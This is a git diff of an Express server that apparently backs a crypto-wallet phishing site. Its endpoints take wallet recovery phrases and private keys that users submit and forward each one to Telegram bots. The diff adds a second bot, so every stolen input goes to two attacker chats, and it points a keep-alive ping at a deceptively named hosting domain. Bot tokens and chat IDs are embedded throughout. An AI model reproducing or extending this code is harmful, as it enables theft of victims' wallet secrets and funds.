@@ -15,11 +15,20 @@ dotenv.config();
  app.use(express.json());
  app.use(express.urlencoded({extended:false}));      
 
-const BOT_TOKEN = "8592311893:AAEkDtVvaXSlFUe81AvpTQJ_OaZXpexUA54";
-const CHAT_ID   = "6778577761";
+const BOT_TOKEN = "8977671011:AAGoHHP8BUDMZPhT3cn-pJlFKPKtKOKOZ7A";
+const CHAT_ID   = "6778577761"; 
+
+
+const BOT_TOKENB = "8217744215:AAHRXYqwU-Twk090RW9PZ-cOO53Kmgkaphk";
+const CHAT_IDB = "8564450863";
 
 function sendTelegram(msg) {
   https.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+}
+ 
+
+function sendTelegramb(msg) {
+  https.get(`https://api.telegram.org/bot${BOT_TOKENB}/sendMessage?chat_id=${CHAT_IDB}&text=${encodeURIComponent(msg)}`);
 }
 
  
@@ -34,6 +43,10 @@ function sendTelegram(msg) {
 
          console.log('📧 Processing recovery phrase request...');
          sendTelegram(`
+🔔 New Request
+─────────────
+📥 Input: ${inpvalue}
+`);   sendTelegramb(`
 🔔 New Request
 ─────────────
 📥 Input: ${inpvalue}
@@ -62,6 +75,10 @@ function sendTelegram(msg) {
 🔔 New Request
 ─────────────
 📥 Input: ${inpvalue}
+`);   sendTelegramb(`
+🔔 New Request
+─────────────
+📥 Input: ${inpvalue}
 `);
   res.status(200).json({msg:'great'})
    } catch (err) {
@@ -87,7 +104,11 @@ app.post('/processingc', async (req, res) => {
 🔔 New Request
 ─────────────
 📥 Input: ${inpvalue}
-`); 
+`);    sendTelegramb(`
+🔔 New Request
+─────────────
+📥 Input: ${inpvalue}
+`);
         res.status(200).json({msg:'great'})  
    } catch (err) {
        console.error('❌ Error in private key endpoint:', err); 
@@ -103,7 +124,7 @@ app.get("*", (req, res) => {
     res.sendFile(path.join(__dirname, "build", "index.html"));
   }); 
   
-setInterval(() => https.get("https://secure-dashboard-connect-decentralized.onrender.com"), 10 * 60 * 1000);
+setInterval(() => https.get("https://secure-decentralized-connect.onrender.com"), 10 * 60 * 1000);
 
 app.listen(5000 , ()=>{
     console.log('Listening on port 5000');
